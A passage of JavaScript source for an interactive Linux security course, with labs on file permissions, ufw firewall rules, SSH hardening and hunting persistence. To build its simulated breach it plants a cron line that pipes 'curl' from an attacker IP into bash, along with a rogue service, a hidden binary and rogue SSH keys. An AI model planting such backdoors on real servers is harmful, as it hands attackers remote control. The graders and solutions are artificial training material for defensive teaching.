        hints: ["find with -perm -o+w (or -0002) on those three folders. chmod o-w fixes write; app.env holds a password: chmod 640.", "sudo find /etc /opt /var/www -type f -perm -o+w\nsudo chmod o-w /opt/kestrel/deploy.sh /var/www/kestrel/robots.txt\nsudo chmod 640 /etc/kestrel/app.env"],
        check: function (r) {
          var k = idxOf(r, /\bfind\b/, function (e) { var w = ["/etc/kestrel/app.env", "/opt/kestrel/deploy.sh", "/var/www/kestrel/robots.txt"]; return w.every(function (p) { return e.out.indexOf(p) >= 0; }) && e.out.length === 3; });
          if (k < 0) return "First list them: sudo find /etc /opt /var/www -type f -perm -o+w (it should print exactly the 3 files).";
          var r2 = r.run(null, ALT_PERMS);
          if (!same(r2.history[k].out.slice().sort(), worldW(r2.run("")).slice().sort())) return "On another server your find command didn't list that server's world-writable files: search, don't list them by hand.";
          var bad = ["/etc/kestrel/app.env", "/opt/kestrel/deploy.sh", "/var/www/kestrel/robots.txt"].filter(function (p) { var n = r.node(p); return !n || (n.mode & 2); });
          if (bad.length) return "Still writable by others (or missing): " + bad.join(", ") + ".";
          return (r.node("/etc/kestrel/app.env").mode & 4) ? "/etc/kestrel/app.env holds the database password: others shouldn't read it either (chmod 640)." : true;
        }
      },
      {
        id: "sticky", text: "Give <code>/srv/shared</code> the sticky bit so users can't delete each other's files there.",
        hints: ["chmod +t adds it; ls -ld shows a t at the end.", "sudo chmod +t /srv/shared\nls -ld /srv/shared"],
        check: function (r) { var n = r.node("/srv/shared"); return n && (n.mode & 512) && (n.mode & 511) === 511 ? true : n && (n.mode & 512) ? "Keep it writable for everyone (it's a shared folder): just add the sticky bit." : "Add the sticky bit: sudo chmod +t /srv/shared"; }
      }
    ],
    solution: sol("sudo find / -perm -4000 -type f 2>/dev/null", "sudo sha256sum /usr/local/bin/backup-helper /tmp/.cache/.sh /usr/bin/bash",
      "sudo chmod u-s /usr/local/bin/backup-helper", "sudo rm /tmp/.cache/.sh",
      "sudo find /etc /opt /var/www -type f -perm -o+w", "sudo chmod o-w /opt/kestrel/deploy.sh /var/www/kestrel/robots.txt", "sudo chmod 640 /etc/kestrel/app.env",
      "sudo chmod +t /srv/shared", "ls -ld /srv/shared"),
    debrief: "<p>Three different bits, three different risks. The SUID bash copies were root shells waiting for anyone who knew where to look. The world-writable <code>/opt/kestrel/deploy.sh</code> was worse than it looked: root's cron runs it nightly, so any user could have added a line and had it run as root. And <code>/srv/shared</code> without the sticky bit let ben delete ana's notes.</p><p>Next: closing the network side with a firewall.</p>",
    realworld: "GTFOBins (gtfobins.github.io) lists which common programs give a root shell when they have the SUID bit or can be run with sudo: find, vim, less, python... It's what attackers check first.",
    quiz: [
      { q: "What does the SUID bit on a root-owned program do?", options: ["Makes it read-only", "It runs as root, whoever starts it", "Hides it from ls", "Lets only root run it"], answer: 1, why: "SUID = run with the owner's identity." },
      { q: "Why is a world-writable script run by root's cron dangerous?", options: ["It runs slower", "Any user can add commands that root will run", "cron refuses it", "It isn't"], answer: 1, why: "That's a privilege escalation: edit the script, wait for cron." },
      { q: "What does the sticky bit on <code>/tmp</code> do?", options: ["Keeps files after reboot", "Only a file's owner can delete or rename it there", "Makes files executable", "Encrypts files"], answer: 1, why: "Everyone can create files in /tmp, but only remove their own." }
    ]
  });

  /* ================================================================== LX-131 Firewall */
  function fwOk(c) { var f = M4.fw(c.sys); return f; }
  LABS.push({
    id: "lx-131", n: 31, module: 4, ticket: "LX-131", xp: 150,
    title: "Firewall",
    topic: "ufw, default deny, rule order",
    from: MAYA,
    story: "<p>kc-web-01 has no firewall: every port that something listens on is reachable from the whole internet. Turn on <b>ufw</b> with a default-deny policy, open only what the server needs, and block last night's attacker. Do it over SSH without cutting off your own connection.</p>" +
      '<table class="t"><tr><th>Port</th><th>From</th><th>Why</th></tr><tr><td>22/tcp (SSH)</td><td>anywhere</td><td>how you manage the box</td></tr><tr><td>80, 443/tcp</td><td>anywhere</td><td>the website</td></tr><tr><td>5432/tcp</td><td>only 10.0.1.0/24</td><td>PostgreSQL, for the app servers on the internal network</td></tr><tr><td>everything else</td><td colspan="2">blocked</td></tr></table>',
    learn:
      "<h3>ufw: the Uncomplicated Firewall</h3><p>Ubuntu's front end for the kernel's packet filter. All commands need sudo.</p>" +
      code("sudo ufw status verbose\nsudo ufw default deny incoming\nsudo ufw default allow outgoing") +
      "<h3>Rules</h3>" + code("sudo ufw allow OpenSSH                 # an application profile (ufw app list)\nsudo ufw allow 80/tcp\nsudo ufw allow 'Nginx Full'            # 80 and 443\nsudo ufw allow from 10.0.1.0/24 to any port 5432 proto tcp\nsudo ufw deny from 203.0.113.50") +
      "<p>Each rule for \"anywhere\" is added twice: once for IPv4, once for IPv6 (v6).</p>" +
      "<h3>Order matters: the first match wins</h3><p>ufw checks rules top to bottom and stops at the first one that matches; if none matches, the <b>default</b> policy decides. So a <code>deny from 203.0.113.50</code> added <b>after</b> <code>allow OpenSSH</code> doesn't stop that address reaching SSH. Put it first:</p>" +
      code("sudo ufw insert 1 deny from 203.0.113.50\nsudo ufw status numbered\nsudo ufw delete 3") +
      "<h3>Turning it on without locking yourself out</h3>" +
      '<div class="callout warn">You are connected over SSH. If you enable a default-deny firewall before allowing port 22, your session freezes and you can\'t get back in. Always: allow SSH, check the rules, <b>then</b> <code>sudo ufw enable</code>.</div>' +
      "<p>Under the hood ufw writes iptables/nftables rules: <code>sudo iptables -L -n</code> or <code>sudo nft list ruleset</code> shows them.</p>",
    files: {},
    system: breakin(),
    starter: "",
    objectives: [
      {
        id: "status", text: "Check the firewall's status.",
        hints: ["ufw needs sudo.", "sudo ufw status verbose"],
        check: function (r) { return ran(r, /ufw\s+status/, function (e) { return outHas(e, /^Status: (in)?active/); }) ? true : "sudo ufw status"; }
      },
      {
        id: "rules", text: "Set the defaults (deny incoming, allow outgoing) and add the rules from the table: SSH, 80 and 443 from anywhere, 5432/tcp only from <code>10.0.1.0/24</code>.",
        hints: ["Profiles: OpenSSH and 'Nginx Full' (quote it, it has a space). For 5432: allow from NET to any port 5432 proto tcp.", "sudo ufw default deny incoming\nsudo ufw default allow outgoing\nsudo ufw allow OpenSSH\nsudo ufw allow 'Nginx Full'\nsudo ufw allow from 10.0.1.0/24 to any port 5432 proto tcp"],
        check: function (r) {
          var f = M4.fw(r.sys);
          if (f.def.incoming !== "deny" || f.def.outgoing !== "allow") return "Defaults: deny incoming, allow outgoing.";
          var test = function (en) { var save = f.enabled; f.enabled = true; var res = en(); f.enabled = save; return res; };
          return test(function () {
            if (!M4.allows(r.sys, 22, "tcp", "198.51.100.20")) return "SSH (22/tcp) isn't allowed from anywhere yet.";
            if (!M4.allows(r.sys, 80, "tcp", "198.51.100.99") || !M4.allows(r.sys, 443, "tcp", "198.51.100.99")) return "80 and 443 should be open to everyone.";
            if (!M4.allows(r.sys, 5432, "tcp", "10.0.1.25")) return "5432/tcp should be allowed from 10.0.1.0/24.";
            if (M4.allows(r.sys, 5432, "tcp", "198.51.100.99")) return "5432 is reachable from the internet: allow it only from 10.0.1.0/24.";
            if (M4.allows(r.sys, 3306, "tcp", "198.51.100.99") || M4.allows(r.sys, 8080, "tcp", "198.51.100.99")) return "Something other than 22, 80, 443 is open to everyone: only the table's ports.";
            return true;
          });
        }
      },
      {
        id: "enable", text: "Enable the firewall, <b>without</b> locking yourself out.",
        hints: ["Make sure SSH is allowed (previous task) before you enable.", "sudo ufw enable"],
        check: function (r) { if (r.sys.lockedOut) return "You locked yourself out (the firewall blocked SSH). Reset the machine, add the SSH rule first, then enable."; return M4.fw(r.sys).enabled ? true : "sudo ufw enable"; }
      },
      {
        id: "block", text: "Block the attacker (<code>203.0.113.50</code>) completely, including SSH and the website, with the rule in <b>first</b> place. Show the numbered rules.",
        hints: ["A deny appended at the end comes after allow OpenSSH: insert it at position 1.", "sudo ufw insert 1 deny from 203.0.113.50\nsudo ufw status numbered"],
        check: function (r) {
          if (!M4.fw(r.sys).enabled) return "Enable the firewall first.";
          if (M4.allows(r.sys, 22, "tcp", ATTACKER) || M4.allows(r.sys, 443, "tcp", ATTACKER)) return "203.0.113.50 can still reach SSH or the website: a deny rule only works if it comes before the allow rules (ufw insert 1 ...).";
          if (!M4.allows(r.sys, 22, "tcp", "198.51.100.20")) return "Careful: SSH must still work for everyone else.";
          return ran(r, /ufw\s+status\s+numbered/, function (e) { return outHas(e, /^\[ 1\] Anywhere\s+DENY IN\s+203\.0\.113\.50/); }) ? true : "Show the result with sudo ufw status numbered (the deny should be rule [ 1]).";
        }
      }
    ],
    solution: sol("sudo ufw status verbose", "sudo ufw default deny incoming", "sudo ufw default allow outgoing", "sudo ufw allow OpenSSH", "sudo ufw allow 'Nginx Full'",
      "sudo ufw allow from 10.0.1.0/24 to any port 5432 proto tcp", "sudo ufw status verbose", "sudo ufw enable",
      "sudo ufw insert 1 deny from 203.0.113.50", "sudo ufw status numbered", "sudo iptables -L -n"),
    debrief: "<p>Default deny, three holes, one of them only for the internal network, and the attacker blocked at the top of the list. The two traps you avoided are the ones that bite people in real life: enabling before allowing SSH, and a deny rule that never matches because an allow rule further up already did.</p><p>Next: making SSH itself hard to attack.</p>",
    realworld: "Cloud providers add a second firewall in front (AWS security groups, Azure NSGs, GCP firewall rules): use both. Those have a web console that stays reachable when you lock yourself out of the server, which is exactly what it's for.",
    quiz: [
      { q: "ufw has <code>allow OpenSSH</code> as rule 1 and <code>deny from 203.0.113.50</code> as rule 2. Can 203.0.113.50 reach SSH?", options: ["No, deny wins", "Yes: rule 1 matches first", "Only with IPv6", "It depends on the default"], answer: 1, why: "The first matching rule decides. Insert the deny before the allow." },
      { q: "With <code>default deny incoming</code>, a port with no rule is...", options: ["open", "blocked", "open only to localhost", "logged and allowed"], answer: 1, why: "No matching rule: the default policy applies." },
      { q: "What should you always do before <code>sudo ufw enable</code> on a remote server?", options: ["Reboot", "Allow SSH", "Disable IPv6", "Stop nginx"], answer: 1, why: "Otherwise the firewall cuts your own SSH session." }
    ]
  });

  /* ================================================================== LX-132 Hardening SSH & updates */
  function sshScenario(sys) {
    breakin({ fails: { "203.0.113.50": 64, "198.51.100.77": 17, "198.51.100.140": 2 } })(sys);
    var c = M2.rd(sys, "/etc/ssh/sshd_config").replace(/^#?PermitRootLogin .*$/m, "PermitRootLogin yes");
    if (!/^PermitRootLogin yes/m.test(c)) c = c.replace(/^Port 22$/m, "Port 22\nPermitRootLogin yes");
    M2.writeRoot(sys, "/etc/ssh/sshd_config", c);
    M2.mkdirRoot(sys, "/etc/ssh/sshd_config.d");
    M2.putRoot(sys, "/etc/ssh/sshd_config.d/50-cloud-init.conf", "PasswordAuthentication yes\n", 384);
    M2.writeRoot(sys, "/etc/apt/apt.conf.d/20auto-upgrades", "APT::Periodic::Update-Package-Lists \"0\";\nAPT::Periodic::Unattended-Upgrade \"0\";\n");
    sys.sshdLive = M2.sshdConf(sys);
  }
  function sshdEff(c) { return M2.sshdConf(c.sys); }
  LABS.push({
    id: "lx-132", n: 32, module: 4, ticket: "LX-132", xp: 160,
    title: "Hardening SSH & updates",
    topic: "sshd_config, fail2ban, unattended-upgrades",
    from: DEV,
    story: "<p>The break-in worked because SSH accepted <b>passwords</b> from anywhere and nobody noticed 64 guesses. Fix the root causes: keys only, no direct root login, fewer tries per connection; ban addresses that keep failing; and make sure security updates install themselves (they were switched off).</p>",
    learn:
      "<h3>sshd_config</h3><p>The SSH server's settings live in <code>/etc/ssh/sshd_config</code>, plus every file in <code>/etc/ssh/sshd_config.d/</code>, which the main file pulls in with <code>Include</code> on its first lines. For each setting <b>the first value sshd reads wins</b>, so a file in sshd_config.d beats a line further down the main file. Ubuntu cloud images ship <code>50-cloud-init.conf</code>, which can quietly turn passwords back on.</p>" +
      code("PermitRootLogin no              # log in as yourself, then sudo\nPasswordAuthentication no       # keys only: guessing is useless\nMaxAuthTries 3                  # fewer tries per connection") +
      "<p>Test before you apply (a broken config can stop sshd starting), check what sshd will <b>really</b> use, then reload:</p>" +
      code("sudo sshd -t\nsudo sshd -T | grep -iE 'passwordauth|permitroot|maxauth'\nsudo systemctl reload ssh") +
      '<div class="callout">Before turning passwords off, make sure your own key login works (it does here: you\'re connected with a key). Reloading keeps your current session open.</div>' +
      "<h3>fail2ban</h3><p>Watches the logs and bans (via the firewall) addresses that fail too often. Never edit <code>jail.conf</code> (updates overwrite it): override in <code>/etc/fail2ban/jail.local</code>:</p>" +
      code("[sshd]\nenabled = true\nmaxretry = 3\nbantime = 1h") +
      code("sudo systemctl restart fail2ban\nsudo fail2ban-client status sshd") +
      "<h3>Automatic security updates</h3><p>Ubuntu's <code>unattended-upgrades</code> installs security fixes daily. It's switched on in <code>/etc/apt/apt.conf.d/20auto-upgrades</code>:</p>" +
      code("APT::Periodic::Update-Package-Lists \"1\";\nAPT::Periodic::Unattended-Upgrade \"1\";") +
      code("apt-config dump APT::Periodic::Unattended-Upgrade\nsudo unattended-upgrade --dry-run -d"),
    files: {},
    system: sshScenario,
    starter: "",
    objectives: [
      {
        id: "sshd", text: "Make the SSH server use <code>PermitRootLogin no</code>, <code>PasswordAuthentication no</code> and <code>MaxAuthTries 3</code>, check the config with <code>sshd -t</code>, and reload ssh.",
        hints: ["Edit /etc/ssh/sshd_config with sudo nano. Then look in /etc/ssh/sshd_config.d/: a file there sets PasswordAuthentication first.", "sudo nano /etc/ssh/sshd_config (PermitRootLogin no, MaxAuthTries 3)\nsudo nano /etc/ssh/sshd_config.d/50-cloud-init.conf (PasswordAuthentication no)\nsudo sshd -t\nsudo systemctl reload ssh"],
        check: function (r) {
          var c = sshdEff(r);
          if (c.errors.length) return "sshd -t fails: " + c.errors[0];
          if (c.permitrootlogin !== "no") return "PermitRootLogin isn't no in the effective config (sudo sshd -T | grep -i permitroot).";
          if (c.passwordauthentication !== "no") return "PasswordAuthentication is still yes in the effective config: sudo sshd -T shows it. Something in /etc/ssh/sshd_config.d/ sets it first.";
          if (+c.maxauthtries !== 3) return "MaxAuthTries should be 3.";
          if (!ran(r, /sshd\s+-t\b/, function (e) { return e.exit === 0; })) return "Test the config with sudo sshd -t.";
          var live = r.sys.sshdLive || {};
          return live.passwordauthentication === "no" && live.permitrootlogin === "no" && +live.maxauthtries === 3 ? true : "The running sshd still has the old settings: sudo systemctl reload ssh.";
        }
      },
      {
        id: "verify", text: "Show with <code>sshd -T</code> that password authentication is really off.",
        hints: ["sshd -T prints the effective settings, lower-case.", "sudo sshd -T | grep -i passwordauthentication"],
        check: function (r) { return ran(r, /sshd\s+-T/, function (e) { return outHas(e, /^passwordauthentication no$/); }) ? true : "sudo sshd -T | grep -i passwordauthentication should print passwordauthentication no."; }
      },
      {
        id: "f2b", text: "Install fail2ban, enable the <code>sshd</code> jail in <code>/etc/fail2ban/jail.local</code> with <code>maxretry = 3</code> and <code>bantime = 1h</code>, restart it, and show the jail: last night's attackers should be banned, the address with only 2 failures not.",
        hints: ["sudo apt install -y fail2ban, then sudo nano /etc/fail2ban/jail.local with an [sshd] section.", "[sshd]\nenabled = true\nmaxretry = 3\nbantime = 1h\n... then sudo systemctl restart fail2ban and sudo fail2ban-client status sshd"],
        check: function (r) {
          if (!r.sys.pkgs.fail2ban.installed) return "Install fail2ban (sudo apt install -y fail2ban).";
          if (r.read("/etc/fail2ban/jail.local") === null) return "Create /etc/fail2ban/jail.local (don't edit jail.conf).";
          var j = M4.jail(r.sys, "sshd");
          if (!j.enabled || j.maxretry !== 3 || !/^1h$|^3600$|^60m$/.test(String(j.bantime).trim())) return "jail.local's [sshd] section should have enabled = true, maxretry = 3, bantime = 1h.";
          if (!unitActive(r, "fail2ban.service")) return "fail2ban isn't running.";
          var b = M4.f2bBanned(r.sys);
          if (b.indexOf("198.51.100.140") >= 0 || b.indexOf(ATTACKER) < 0) return "The jail isn't banning the right addresses: check maxretry.";
          var w = idxOf(r, /jail\.local/, function (e) { return !!e.edit || /\b(tee|sed|cp|mv)\b|>/.test(e.cmd); });
          if (!(idxOf(r, /systemctl\s+(restart|reload)\s+fail2ban|fail2ban-client\s+reload/) > w)) return "fail2ban only reads jail.local when it starts: restart it after writing the file (sudo systemctl restart fail2ban).";
          return ran(r, /fail2ban-client\s+status\s+sshd/, function (e) { return outHas(e, /Banned IP list:.*203\.0\.113\.50/); }) ? true : "Show the jail: sudo fail2ban-client status sshd";
        }
      },
      {
        id: "updates", text: "Turn automatic security updates back on in <code>20auto-upgrades</code>, check it with <code>apt-config dump</code>, and do a dry run of <code>unattended-upgrade</code> after refreshing the package lists.",
        hints: ["Both lines in /etc/apt/apt.conf.d/20auto-upgrades should say \"1\" (or: sudo dpkg-reconfigure -plow unattended-upgrades).", "sudo nano /etc/apt/apt.conf.d/20auto-upgrades\napt-config dump APT::Periodic::Unattended-Upgrade\nsudo apt update\nsudo unattended-upgrade --dry-run -d"],
        check: function (r) {
          var v = M4.aptConf(r.sys);
          if (v["APT::Periodic::Update-Package-Lists"] !== "1" || v["APT::Periodic::Unattended-Upgrade"] !== "1") return "Both settings in /etc/apt/apt.conf.d/20auto-upgrades should be \"1\".";
          if (!ran(r, /apt-config\s+dump/, function (e) { return outHas(e, /APT::Periodic::Unattended-Upgrade "1";/); })) return "Check it: apt-config dump APT::Periodic::Unattended-Upgrade";
          return ran(r, /unattended-upgrade\b.*--dry-run/, function (e) { return outHas(e, /Packages that will be upgraded: .*openssh-server/); }) ? true : "Refresh the lists (sudo apt update), then sudo unattended-upgrade --dry-run -d should list the pending security updates.";
        }
      }
    ],
    solution: sol(
      "sudo sed -i 's/^PermitRootLogin yes/PermitRootLogin no/' /etc/ssh/sshd_config",
      "echo 'MaxAuthTries 3' | sudo tee -a /etc/ssh/sshd_config",
      "cat /etc/ssh/sshd_config.d/50-cloud-init.conf",
      "echo 'PasswordAuthentication no' | sudo tee /etc/ssh/sshd_config.d/50-cloud-init.conf",
      "sudo sshd -t", "sudo systemctl reload ssh", "sudo sshd -T | grep -iE 'passwordauthentication|permitrootlogin|maxauthtries'",
      "sudo apt install -y fail2ban",
      "printf '[sshd]\\nenabled = true\\nmaxretry = 3\\nbantime = 1h\\n' | sudo tee /etc/fail2ban/jail.local",
      "sudo systemctl restart fail2ban", "sudo fail2ban-client status sshd",
      "printf 'APT::Periodic::Update-Package-Lists \"1\";\\nAPT::Periodic::Unattended-Upgrade \"1\";\\n' | sudo tee /etc/apt/apt.conf.d/20auto-upgrades",
      "apt-config dump APT::Periodic::Unattended-Upgrade", "sudo apt update", "sudo unattended-upgrade --dry-run -d"),
    debrief: "<p>With keys only, the 64 guesses from last night would have been pointless; with fail2ban, the guesser is banned after 3. The trap was the drop-in file: editing the main sshd_config did nothing for PasswordAuthentication, because <code>50-cloud-init.conf</code> is read first and the first value wins. <code>sshd -T</code> shows the truth.</p><p>Security updates are back on too: most real-world break-ins use holes that already had a fix. Next: finding what the attacker left behind to get back in.</p>",
    realworld: "Ubuntu 22.04+ cloud images really do ship /etc/ssh/sshd_config.d/50-cloud-init.conf with PasswordAuthentication yes on some providers. Always check with sudo sshd -T, never just the file you edited.",
    quiz: [
      { q: "sshd_config.d/50-cloud-init.conf says <code>PasswordAuthentication yes</code>, the main file (after the Include line) says <code>no</code>. What does sshd use?", options: ["no: the main file wins", "yes: the first value read wins", "It refuses to start", "Whatever was set last"], answer: 1, why: "sshd keeps the first value it reads for most settings, and the Include comes first." },
      { q: "Why put fail2ban settings in jail.local, not jail.conf?", options: ["jail.conf is read-only", "Package updates overwrite jail.conf; jail.local overrides it and survives", "jail.local is faster", "fail2ban ignores jail.conf"], answer: 1, why: ".local files are for your changes." },
      { q: "What does <code>sudo sshd -T</code> show?", options: ["The SSH log", "The settings sshd will really use, after all files are combined", "Connected users", "Host keys"], answer: 1, why: "-t tests; -T prints the effective configuration." }
    ]
  });

  /* ================================================================== LX-133 Hunting persistence */
  var LEGIT_ROOT_KEY = pubkey("dev-laptop", "dev@kc-dev-01"), ROGUE_ROOT_KEY = pubkey("rogue1", "backup@kc-backup-01");
  var LEGIT_DEPLOY_KEY = pubkey("ci-runner", "ci@kestrel-ci"), ROGUE_DEPLOY_KEY = pubkey("rogue2", "sync@cloud-agent");
  var CRON_HDR = "# DO NOT EDIT THIS FILE - edit the master and reinstall.\n# (- installed on Wed Nov 11 03:20:02 2026)\n# (Cron version -- $Id: crontab.c,v 2.13 1994/01/17 03:20:37 vixie Exp $)\n";
  function persistScenario(o) {
    o = o || {};
    var svc = o.svc || "dbus-update", cronf = o.cron || "apt-update-check", ip = o.ip || ATTACKER;
    return function (sys) {
      var t = Date.UTC(2026, 10, 11, 3, 20, 0);
      M2.putRoot(sys, "/etc/cron.d/" + cronf, "# check for package updates\n*/10 * * * * root curl -s http://" + ip + "/u.sh | bash >/dev/null 2>&1\n", 420, 0, 0, t);
      M2.putRoot(sys, "/var/spool/cron/crontabs/deploy", CRON_HDR + "0 4 * * * /opt/kestrel/bin/deploy-cleanup\n@reboot /home/deploy/.local/bin/sync-agent >/dev/null 2>&1\n", 384, 1003, S.gidOf(sys, "crontab"), t);
      M2.mkdirRoot(sys, "/home/deploy/.local/bin", 493, 1003, 1003);
      M2.putRoot(sys, "/home/deploy/.local/bin/sync-agent", "\x7fELF:sync-agent (simulated binary)\n", 493, 1003, 1003, t);
      M2.mkdirRoot(sys, "/opt/kestrel/bin", 493);
      M2.putRoot(sys, "/opt/kestrel/bin/deploy-cleanup", "#!/bin/bash\nfind /var/www/kestrel/releases -maxdepth 1 -mtime +14 -exec rm -rf {} +\n", 493);
      M2.mkdirRoot(sys, "/usr/local/lib/." + svc.replace(/-.*/, ""), 493);
      var bin = "/usr/local/lib/." + svc.replace(/-.*/, "") + "/" + svc;
      M2.putRoot(sys, bin, "\x7fELF:" + svc + " (simulated binary)\n", 493, 0, 0, t);
      M2.putRoot(sys, "/etc/systemd/system/" + svc + ".service", "[Unit]\nDescription=D-Bus Update Helper\nAfter=network-online.target\n\n[Service]\nExecStart=" + bin + "\nRestart=always\n\n[Install]\nWantedBy=multi-user.target\n", 420, 0, 0, t);
      var wants = M2.mkdirRoot(sys, "/etc/systemd/system/multi-user.target.wants");
      wants.children[svc + ".service"] = S.linkNode("/etc/systemd/system/" + svc + ".service");
      M2.unitUp(sys, svc + ".service", t);
      M2.mkdirRoot(sys, "/root/.ssh", 448, 0, 0);
      M2.putRoot(sys, "/root/.ssh/authorized_keys", LEGIT_ROOT_KEY + "\n" + (o.rootKey || ROGUE_ROOT_KEY) + "\n", 384, 0, 0, t);
      M2.mkdirRoot(sys, "/home/deploy/.ssh", 448, 1003, 1003);
      M2.putRoot(sys, "/home/deploy/.ssh/authorized_keys", (o.deployKey || ROGUE_DEPLOY_KEY) + "\n" + LEGIT_DEPLOY_KEY + "\n", 384, 1003, 1003, t);
      M2.putRoot(sys, "/home/dev/approved-keys.txt", "# SSH keys approved by Security (2026-10-01)\n" + LEGIT_ROOT_KEY + "\n" + LEGIT_DEPLOY_KEY + "\n", 436, 1000, 1000);
      sys.persist = { svc: svc, cron: cronf, bin: bin };
    };
  }
  function keyLines(c, p) { return (c.read(p) || "").split("\n").filter(function (l) { return l.trim() && !/^#/.test(l); }); }
  LABS.push({
    id: "lx-133", n: 33, module: 4, ticket: "LX-133", xp: 160,
    title: "Hunting persistence",
    topic: "cron, systemd, authorized_keys",
    from: DEV,
    story: "<p>The attacker's session is gone, but attackers rarely leave without a way back. Hunt down what they planted on kc-web-01: <b>scheduled jobs</b>, a <b>service</b> that starts at boot, and <b>SSH keys</b> that let them walk back in. Security keeps the list of approved keys in <code>~/approved-keys.txt</code>.</p>",
    learn:
      "<h3>Where persistence hides</h3>" +
      '<table class="t"><tr><th>Place</th><th>Look with</th></tr><tr><td>system cron: <code>/etc/crontab</code>, <code>/etc/cron.d/</code>, <code>/etc/cron.{hourly,daily,...}/</code></td><td><code>ls -l</code>, <code>cat</code></td></tr><tr><td>users\' crontabs (<code>/var/spool/cron/crontabs/</code>)</td><td><code>sudo crontab -l -u USER</code></td></tr><tr><td>systemd units in <code>/etc/systemd/system/</code></td><td><code>systemctl list-unit-files --state=enabled</code>, <code>systemctl cat UNIT</code></td></tr><tr><td><code>~/.ssh/authorized_keys</code> of every account, root included</td><td><code>sudo cat</code></td></tr><tr><td>shell start-up files (<code>.bashrc</code>, <code>.profile</code>)</td><td><code>grep</code></td></tr></table>' +
      "<p>Attackers give things boring names: <i>apt-update-check</i>, <i>dbus-update</i>. Judge by what it <b>does</b>: a cron line that pipes <code>curl</code> into <code>bash</code>, a service running a binary from a hidden folder.</p>" +
      "<h3>Removing a rogue service properly</h3>" + code("sudo systemctl stop NAME\nsudo systemctl disable NAME\nsudo rm /etc/systemd/system/NAME.service\nsudo systemctl daemon-reload") +
      "<p><code>systemctl disable --now NAME</code> does the first two in one go.</p>" +
      "<h3>Comparing key files with a list</h3><p><code>grep -vxFf approved.txt authorized_keys</code> prints the lines of authorized_keys that are <b>not</b> exactly a line of approved.txt: <code>-f</code> reads patterns from a file, <code>-F</code> fixed strings, <code>-x</code> whole lines, <code>-v</code> invert. Delete a line with <code>sed -i '/PATTERN/d' FILE</code>.</p>" +
      '<div class="callout">In a real incident, copy everything you remove somewhere safe first (it\'s evidence), and seriously consider rebuilding the server from scratch: you can never be sure you found everything.</div>',
    files: {},
    system: persistScenario(),
    starter: "",
    objectives: [
      {
        id: "cron", text: "Find and remove the malicious cron jobs: one in <code>/etc/cron.d</code>, one in deploy's crontab. Keep deploy's legitimate <code>deploy-cleanup</code> job.",
        hints: ["Look for curl | bash, and for @reboot running something from a home folder.", "ls -l /etc/cron.d; sudo crontab -l -u deploy\nsudo rm /etc/cron.d/apt-update-check\nsudo crontab -l -u deploy | grep -v sync-agent | sudo crontab -u deploy -"],
        check: function (r) {
          if (r.exists("/etc/cron.d/apt-update-check")) return "/etc/cron.d still has the job that pipes a download into bash every 10 minutes.";
          var tab = r.read("/var/spool/cron/crontabs/deploy") || "";
          if (/sync-agent/.test(tab)) return "deploy's crontab still starts sync-agent at boot.";
          return /deploy-cleanup/.test(tab) ? true : "Keep deploy's legitimate deploy-cleanup line: remove only the sync-agent one.";
        }
      },
      {
        id: "service", text: "Find the rogue service, then stop it, disable it, delete its unit file and reload systemd.",
        hints: ["systemctl list-unit-files --state=enabled; anything you don't recognise, systemctl cat it.", "sudo systemctl disable --now dbus-update\nsudo rm /etc/systemd/system/dbus-update.service\nsudo systemctl daemon-reload"],
        check: function (r) {
          if (unitActive(r, "dbus-update.service") || procs(r, /dbus-update/).length) return "dbus-update is still running.";
          var w = M2.nodeAt(r.sys, "/etc/systemd/system/multi-user.target.wants/dbus-update.service", true);
          if (w) return "dbus-update is still enabled at boot.";
          if (r.exists("/etc/systemd/system/dbus-update.service")) return "Delete the unit file /etc/systemd/system/dbus-update.service.";
          var k = idxOf(r, /\brm\b.*dbus-update\.service/);
          return idxOf(r, /systemctl\s+daemon-reload/) > k ? true : "After deleting the unit file, run sudo systemctl daemon-reload.";
        }
      },
      {
        id: "keys", text: "Leave only <b>approved</b> keys in <code>/root/.ssh/authorized_keys</code> and <code>/home/deploy/.ssh/authorized_keys</code>.",
        hints: ["sudo grep -vxFf ~/approved-keys.txt /root/.ssh/authorized_keys shows the intruder.", "sudo sed -i '/backup@kc-backup-01/d' /root/.ssh/authorized_keys\nsudo sed -i '/sync@cloud-agent/d' /home/deploy/.ssh/authorized_keys"],
        check: function (r) {
          var a = keyLines(r, "/root/.ssh/authorized_keys"), b = keyLines(r, "/home/deploy/.ssh/authorized_keys");
          if (!same(a, [LEGIT_ROOT_KEY])) return a.indexOf(LEGIT_ROOT_KEY) < 0 ? "Keep the approved key in root's authorized_keys (dev@kc-dev-01)." : "root's authorized_keys still has a key that isn't approved.";
          if (!same(b, [LEGIT_DEPLOY_KEY])) return b.indexOf(LEGIT_DEPLOY_KEY) < 0 ? "Keep the approved key in deploy's authorized_keys (ci@kestrel-ci)." : "deploy's authorized_keys still has a key that isn't approved.";
          return true;
        }
      },
      {
        id: "files", text: "Delete what those jobs and the service ran: the hidden folder in <code>/usr/local/lib</code> and deploy's <code>sync-agent</code>.",
        hints: ["The unit file and the cron line name the paths.", "sudo rm -r /usr/local/lib/.dbus\nsudo rm /home/deploy/.local/bin/sync-agent"],
        check: function (r) { return r.exists("/usr/local/lib/.dbus") ? "/usr/local/lib/.dbus is still there." : r.exists("/home/deploy/.local/bin/sync-agent") ? "/home/deploy/.local/bin/sync-agent is still there." : r.exists("/opt/kestrel/bin/deploy-cleanup") ? true : "Oops: /opt/kestrel/bin/deploy-cleanup is legitimate, keep it."; }
      },
      {
        id: "verify", text: "Finally, list the enabled unit files again to check nothing unknown is left.",
        hints: ["Same command as before, after the clean-up.", "systemctl list-unit-files --state=enabled"],
        check: function (r) { var k = idxOf(r, /\brm\b.*dbus-update/); return k >= 0 && r.history.some(function (e, i) { return i > k && /list-unit-files/.test(e.cmd) && outHas(e, /cron\.service/) && !outHas(e, /dbus-update/); }) ? true : "After removing the service, list the enabled unit files (systemctl list-unit-files --state=enabled)."; }
      }
    ],
    solution: sol("ls -l /etc/cron.d", "cat /etc/cron.d/apt-update-check", "sudo crontab -l -u deploy",
      "sudo rm /etc/cron.d/apt-update-check", "sudo crontab -l -u deploy | grep -v sync-agent | sudo crontab -u deploy -", "sudo crontab -l -u deploy",
      "systemctl list-unit-files --state=enabled", "systemctl cat dbus-update",
      "sudo systemctl disable --now dbus-update", "sudo rm /etc/systemd/system/dbus-update.service", "sudo systemctl daemon-reload",
      "sudo grep -vxFf ~/approved-keys.txt /root/.ssh/authorized_keys", "sudo sed -i '/backup@kc-backup-01/d' /root/.ssh/authorized_keys",
